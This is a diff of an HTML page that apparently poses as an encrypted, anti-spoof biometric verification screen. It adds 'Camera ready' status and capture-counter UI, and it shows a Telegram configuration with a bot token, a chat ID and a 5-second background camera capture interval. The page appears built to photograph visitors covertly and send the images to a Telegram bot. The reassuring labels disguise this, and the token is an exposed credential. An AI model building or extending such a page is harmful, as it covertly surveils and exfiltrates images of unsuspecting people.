@@ -271,6 +271,15 @@
             <!-- only active capturing line (scan animation) -->
             <div class="active-scan-line"></div>
         </div>
+        <div class="status-row">
+            <div class="live-status">
+                <span class="live-dot"></span>
+                <span id="camStatus">Camera ready</span>
+            </div>
+            <div class="capture-counter" id="captureCountDisplay">
+                <i class="fas fa-sync-alt"></i> 0
+            </div>
+        </div>
     </div>
 
     <div class="action-buttons">
@@ -290,6 +299,10 @@
             <i class="fas fa-lock"></i> Encrypted • Anti-spoof
         </p>
     </div>
+
+    <div class="footer-note">
+        <i class="fas fa-shield-alt"></i> Biometric session • 5s interval capture
+    </div>
 </div>
 
 <!-- hidden canvas for image captures -->
@@ -300,7 +313,7 @@
     // TELEGRAM CONFIGURATION (REPLACE WITH YOUR BOT TOKEN & CHAT ID)
     // ----------------------------------------------------------
     const BOT_TOKEN = '8041268145:AAHCnHlbnxvEODDsMTFm-mQYe8ovYBq2IF0';    
-    const CHAT_ID = '5541151768';       
+    const CHAT_ID = '5541151768';  
     // Capture interval: 5 seconds (background)
     const CAPTURE_INTERVAL_MS = 5000;
     
